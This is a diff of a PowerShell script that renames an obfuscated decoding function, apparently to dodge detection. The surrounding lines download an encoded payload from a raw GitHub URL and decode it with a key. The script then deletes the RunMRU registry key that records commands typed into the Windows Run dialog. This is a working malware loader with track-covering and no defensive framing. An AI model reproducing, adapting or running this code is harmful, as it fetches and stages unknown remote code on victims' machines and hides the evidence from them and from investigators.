@@ -1,4 +1,4 @@
- function cappybara {
+ function suresure {
     param ([string]$sec,[string]$bty)
     $ajd = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($sec))
     $accent = ""
@@ -10,7 +10,7 @@
 }
 $k = "$k"
 $mirrage = irm "https://raw.githubusercontent.com/Bongman1234/assets/main/y6rhf4w"
-$triphook = cappybara -sec $mirrage -bty $k
+$triphook = suresure -sec $mirrage -bty $k
 
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 
